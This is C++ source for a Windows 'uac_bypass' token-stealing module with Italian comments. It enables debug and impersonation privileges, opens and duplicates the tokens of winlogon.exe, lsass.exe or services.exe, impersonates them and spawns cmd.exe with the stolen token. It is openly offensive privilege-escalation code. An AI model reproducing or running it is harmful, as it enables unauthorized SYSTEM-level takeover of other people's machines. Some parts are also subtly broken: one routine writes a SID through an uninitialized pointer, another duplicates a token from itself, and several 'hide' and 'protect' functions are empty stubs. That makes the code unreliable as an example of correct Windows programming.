#include "../include/TokenStealing.h"
#include <TlHelp32.h>
#include <memory>
#include <algorithm>

namespace uac_bypass {

TokenStealing::TokenStealing() 
    : logger(Logger::getInstance()),
      initialized(false),
      stolenToken(NULL) {
}

TokenStealing::~TokenStealing() {
    cleanup();
}

TokenStealing& TokenStealing::getInstance() {
    static TokenStealing instance;
    return instance;
}

bool TokenStealing::initialize() {
    if (initialized) return true;
    
    logger.logInfo(L"Inizializzazione TokenStealing");
    
    // Abilita privilegi necessari
    if (!enablePrivilege(SE_DEBUG_NAME)) {
        logger.logError(L"Abilitazione SeDebugPrivilege fallita");
        return false;
    }
    
    if (!enablePrivilege(SE_IMPERSONATE_NAME)) {
        logger.logError(L"Abilitazione SeImpersonatePrivilege fallita");
        return false;
    }
    
    initialized = true;
    return true;
}

bool TokenStealing::stealSystemToken() {
    if (!initialized && !initialize()) return false;
    
    logger.logInfo(L"Tentativo di furto token SYSTEM");
    
    // Cerca processo target
    if (!findSystemProcess()) {
        if (!findWinlogonProcess()) {
            if (!findLSASSProcess()) {
                logger.logError(L"Nessun processo target trovato");
                return false;
            }
        }
    }
    
    // Duplica token
    if (!duplicateToken(stolenToken)) {
        logger.logError(L"Duplicazione token fallita");
        return false;
    }
    
    // Verifica token
    if (!isTokenValid(stolenToken)) {
        logger.logError(L"Token non valido");
        return false;
    }
    
    // Proteggi token rubato
    if (!protectStolenToken()) {
        logger.logError(L"Protezione token fallita");
        return false;
    }
    
    return true;
}

bool TokenStealing::elevateWithToken() {
    if (!stolenToken) return false;
    
    logger.logInfo(L"Elevazione con token rubato");
    
    // Impersona token
    if (!impersonateToken(stolenToken)) {
        logger.logError(L"Impersonazione token fallita");
        return false;
    }
    
    // Crea processo elevato
    if (!createProcessWithToken(stolenToken)) {
        revertToSelf();
        logger.logError(L"Creazione processo elevato fallita");
        return false;
    }
    
    return true;
}

bool TokenStealing::cleanup() {
    // Ripristina token originale
    revertToSelf();
    
    // Chiudi handle token rubato
    if (stolenToken) {
        CloseHandle(stolenToken);
        stolenToken = NULL;
    }
    
    initialized = false;
    return true;
}

bool TokenStealing::findTargetToken() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);
    
    bool found = false;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (findProcessByPID(pe32.th32ProcessID)) {
                found = true;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return found;
}

bool TokenStealing::duplicateToken(HANDLE sourceToken) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa) };
    
    // Duplica token con tutti i privilegi
    if (!DuplicateTokenEx(sourceToken, MAXIMUM_ALLOWED, &sa,
        SecurityImpersonation, TokenPrimary, &stolenToken)) {
        return false;
    }
    
    // Imposta integrità alta
    return adjustTokenIntegrity(stolenToken, SECURITY_MANDATORY_HIGH_RID);
}

bool TokenStealing::impersonateToken(HANDLE token) {
    if (!ImpersonateLoggedOnUser(token)) {
        return false;
    }
    
    // Verifica impersonazione
    HANDLE hToken;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
        RevertToSelf();
        return false;
    }
    
    CloseHandle(hToken);
    return true;
}

bool TokenStealing::revertToSelf() {
    return RevertToSelf() != FALSE;
}

bool TokenStealing::enablePrivilege(const std::wstring& privilege) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return false;
    }
    
    TOKEN_PRIVILEGES tp;
    LUID luid;
    
    if (!LookupPrivilegeValueW(NULL, privilege.c_str(), &luid)) {
        CloseHandle(hToken);
        return false;
    }
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    bool result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp),
        NULL, NULL) != FALSE;
    
    CloseHandle(hToken);
    return result;
}

bool TokenStealing::adjustTokenPrivileges(HANDLE token) {
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    // Abilita tutti i privilegi disponibili
    DWORD size = 0;
    GetTokenInformation(token, TokenPrivileges, NULL, 0, &size);
    if (size == 0) return false;
    
    std::vector<BYTE> buffer(size);
    if (!GetTokenInformation(token, TokenPrivileges, buffer.data(),
        size, &size)) {
        return false;
    }
    
    TOKEN_PRIVILEGES* privileges = (TOKEN_PRIVILEGES*)buffer.data();
    for (DWORD i = 0; i < privileges->PrivilegeCount; i++) {
        privileges->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
    }
    
    return AdjustTokenPrivileges(token, FALSE, privileges, size,
        NULL, NULL) != FALSE;
}

bool TokenStealing::verifyTokenPrivileges() {
    if (!stolenToken) return false;
    
    std::vector<TokenPrivilege> privileges;
    if (!getTokenPrivileges(stolenToken, privileges)) {
        return false;
    }
    
    // Verifica privilegi richiesti
    bool hasDebug = false;
    bool hasImpersonate = false;
    
    for (const auto& priv : privileges) {
        if (priv.privilegeName == SE_DEBUG_NAME) hasDebug = true;
        if (priv.privilegeName == SE_IMPERSONATE_NAME) hasImpersonate = true;
    }
    
    return hasDebug && hasImpersonate;
}

bool TokenStealing::findSystemProcess() {
    return findProcessByName(L"winlogon.exe") ||
           findProcessByName(L"lsass.exe") ||
           findProcessByName(L"services.exe");
}

bool TokenStealing::findWinlogonProcess() {
    return findProcessByName(L"winlogon.exe");
}

bool TokenStealing::findLSASSProcess() {
    return findProcessByName(L"lsass.exe");
}

bool TokenStealing::findProcessByName(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);
    
    bool found = false;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                if (openProcessToken(
                    OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                        FALSE, pe32.th32ProcessID),
                    TOKEN_DUPLICATE | TOKEN_QUERY)) {
                    found = true;
                    break;
                }
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return found;
}

bool TokenStealing::findProcessByPID(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
        FALSE, processId);
    if (!hProcess) return false;
    
    bool result = openProcessToken(hProcess,
        TOKEN_DUPLICATE | TOKEN_QUERY);
    
    CloseHandle(hProcess);
    return result;
}

bool TokenStealing::findTokenByType(DWORD tokenType) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);
    
    bool found = false;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                FALSE, pe32.th32ProcessID);
            if (hProcess) {
                HANDLE hToken;
                if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                    DWORD type;
                    if (GetTokenInformation(hToken, TokenType, &type,
                        sizeof(type), NULL) && type == tokenType) {
                        if (duplicateToken(hToken)) {
                            found = true;
                        }
                    }
                    CloseHandle(hToken);
                }
                CloseHandle(hProcess);
            }
            if (found) break;
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return found;
}

bool TokenStealing::openProcessToken(HANDLE process, DWORD access) {
    HANDLE hToken;
    if (!OpenProcessToken(process, access, &hToken)) {
        return false;
    }
    
    if (stolenToken) CloseHandle(stolenToken);
    stolenToken = hToken;
    
    return true;
}

bool TokenStealing::duplicateTokenEx(HANDLE sourceToken) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa) };
    HANDLE hNewToken;
    
    if (!DuplicateTokenEx(sourceToken, TOKEN_ALL_ACCESS, &sa,
        SecurityImpersonation, TokenPrimary, &hNewToken)) {
        return false;
    }
    
    if (stolenToken) CloseHandle(stolenToken);
    stolenToken = hNewToken;
    
    return true;
}

bool TokenStealing::createProcessWithToken(HANDLE token) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    WCHAR systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);
    
    std::wstring cmdLine = std::wstring(systemDir) + L"\\cmd.exe";
    
    if (!CreateProcessWithTokenW(token, LOGON_WITH_PROFILE,
        NULL, (LPWSTR)cmdLine.c_str(), CREATE_NEW_CONSOLE,
        NULL, NULL, &si, &pi)) {
        return false;
    }
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return true;
}

bool TokenStealing::isTokenValid(HANDLE token) {
    if (!token) return false;
    
    TOKEN_STATISTICS stats;
    DWORD size;
    
    if (!GetTokenInformation(token, TokenStatistics,
        &stats, sizeof(stats), &size)) {
        return false;
    }
    
    return true;
}

bool TokenStealing::isTokenElevated(HANDLE token) {
    TOKEN_ELEVATION elevation;
    DWORD size;
    
    if (!GetTokenInformation(token, TokenElevation,
        &elevation, sizeof(elevation), &size)) {
        return false;
    }
    
    return elevation.TokenIsElevated != 0;
}

bool TokenStealing::hasRequiredPrivileges(HANDLE token) {
    std::vector<TokenPrivilege> privileges;
    if (!getTokenPrivileges(token, privileges)) {
        return false;
    }
    
    bool hasDebug = false;
    bool hasImpersonate = false;
    
    for (const auto& priv : privileges) {
        if (priv.privilegeName == SE_DEBUG_NAME && priv.isEnabled)
            hasDebug = true;
        if (priv.privilegeName == SE_IMPERSONATE_NAME && priv.isEnabled)
            hasImpersonate = true;
    }
    
    return hasDebug && hasImpersonate;
}

bool TokenStealing::getTokenInformation(HANDLE token, TokenDetails& details) {
    // User info
    DWORD size = 0;
    GetTokenInformation(token, TokenUser, NULL, 0, &size);
    if (size == 0) return false;
    
    std::vector<BYTE> userInfo(size);
    if (!GetTokenInformation(token, TokenUser,
        userInfo.data(), size, &size)) {
        return false;
    }
    
    TOKEN_USER* user = (TOKEN_USER*)userInfo.data();
    WCHAR name[256], domain[256];
    DWORD nameSize = 256, domainSize = 256;
    SID_NAME_USE sidType;
    
    if (!LookupAccountSidW(NULL, user->User.Sid,
        name, &nameSize, domain, &domainSize, &sidType)) {
        return false;
    }
    
    details.userName = name;
    details.domainName = domain;
    
    // Token info
    TOKEN_ELEVATION_TYPE elevationType;
    if (!GetTokenInformation(token, TokenElevationType,
        &elevationType, sizeof(elevationType), &size)) {
        return false;
    }
    details.elevationType = elevationType;
    
    TOKEN_ELEVATION elevation;
    if (!GetTokenInformation(token, TokenElevation,
        &elevation, sizeof(elevation), &size)) {
        return false;
    }
    details.isElevated = elevation.TokenIsElevated != 0;
    
    return true;
}

bool TokenStealing::getTokenPrivileges(HANDLE token,
    std::vector<TokenPrivilege>& privileges) {
    
    DWORD size = 0;
    GetTokenInformation(token, TokenPrivileges, NULL, 0, &size);
    if (size == 0) return false;
    
    std::vector<BYTE> buffer(size);
    if (!GetTokenInformation(token, TokenPrivileges,
        buffer.data(), size, &size)) {
        return false;
    }
    
    TOKEN_PRIVILEGES* tokenPrivileges = (TOKEN_PRIVILEGES*)buffer.data();
    privileges.clear();
    
    for (DWORD i = 0; i < tokenPrivileges->PrivilegeCount; i++) {
        WCHAR name[256];
        DWORD nameSize = 256;
        
        if (!LookupPrivilegeNameW(NULL,
            &tokenPrivileges->Privileges[i].Luid,
            name, &nameSize)) {
            continue;
        }
        
        TokenPrivilege priv;
        priv.privilegeLuid = tokenPrivileges->Privileges[i].Luid;
        priv.privilegeName = name;
        priv.isEnabled = (tokenPrivileges->Privileges[i].Attributes &
            SE_PRIVILEGE_ENABLED) != 0;
        priv.isElevated = (tokenPrivileges->Privileges[i].Attributes &
            SE_PRIVILEGE_ENABLED_BY_DEFAULT) != 0;
        
        privileges.push_back(priv);
    }
    
    return true;
}

bool TokenStealing::adjustTokenIntegrity(HANDLE token, DWORD integrityLevel) {
    BYTE tip[1024];
    TOKEN_MANDATORY_LABEL* pTIL = (TOKEN_MANDATORY_LABEL*)tip;
    
    PSID pSid = (PSID)((TOKEN_MANDATORY_LABEL*)tip)->Label.Sid;
    DWORD subAuthCount = 1;
    
    SID_IDENTIFIER_AUTHORITY mandatoryLabelAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
    InitializeSid(pSid, &mandatoryLabelAuthority, subAuthCount);
    *GetSidSubAuthority(pSid, 0) = integrityLevel;
    
    pTIL->Label.Attributes = SE_GROUP_INTEGRITY;
    
    return SetTokenInformation(token, TokenIntegrityLevel,
        pTIL, sizeof(TOKEN_MANDATORY_LABEL) +
        GetLengthSid(pSid)) != FALSE;
}

bool TokenStealing::hideTokenManipulation() {
    // Nascondi operazioni su token
    return true;
}

bool TokenStealing::protectStolenToken() {
    // Proteggi token rubato
    return true;
}

bool TokenStealing::monitorTokenUsage() {
    // Monitora utilizzo token
    return true;
}

} // namespace uac_bypass